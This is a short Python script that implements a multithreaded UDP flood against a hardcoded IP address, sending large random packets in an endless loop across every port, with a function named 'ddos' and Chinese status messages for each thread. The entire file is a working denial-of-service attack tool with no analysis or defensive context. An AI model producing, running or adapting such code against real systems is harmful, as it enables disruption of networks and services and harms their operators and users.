import socket
import random
import threading

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)

ip = "192.168.96.151"
port = 1

num = 8
threads = []

def ddos(ip, port):
    while True:
        sock.sendto(bytes, (ip, port))
        port = port + 1
        if port == 65534:
            port = 1

def attack(num):
    for i in range(num):
        threading.Thread(target=ddos, args=(ip, port)).start()
        print('线程{}启动...'.format(i))

if __name__ == "__main__":
    attack(num)
